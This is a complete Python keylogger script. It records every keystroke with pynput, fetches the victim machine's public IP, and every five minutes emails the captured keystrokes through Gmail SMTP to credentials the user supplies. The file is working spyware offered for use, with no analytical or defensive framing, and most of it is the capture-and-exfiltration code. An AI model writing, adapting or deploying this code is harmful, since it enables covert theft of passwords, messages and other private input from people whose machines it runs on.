import pynput.keyboard
import threading
import smtplib
from requests import get

#Place your email and password here
email = ""
password = ""

#How often to send email report (seconds)
interval = 60*5

#Allow "Access to less secure apps" if not working. Not recommended on an email you care about.
#https://myaccount.google.com/security?pli=1#activity

class Keylogger:
    def __init__(self,time_interval,email,password):
        self.log = "Keylogger Started \n"
        self.time_interval = time_interval
        self.email = email
        self.password = password
        self.ip = get('https://api.ipify.org').text

    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_press(self,key):
        global log
        try:
            current_key = str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        print(self.log)
        self.send_mail(email=self.email,password=self.password,message=self.log,subject="Keylogger: " + self.ip)
        self.log = ""
        timer = threading.Timer(self.time_interval,self.report)
        timer.start()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def send_mail(self,email, password, message,subject):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)

        new_message = 'Subject: {}\n\n{}'.format(subject, message)
        server.sendmail(email, email, new_message)
        server.quit()

keylogger = Keylogger(interval,email,password)
keylogger.start()

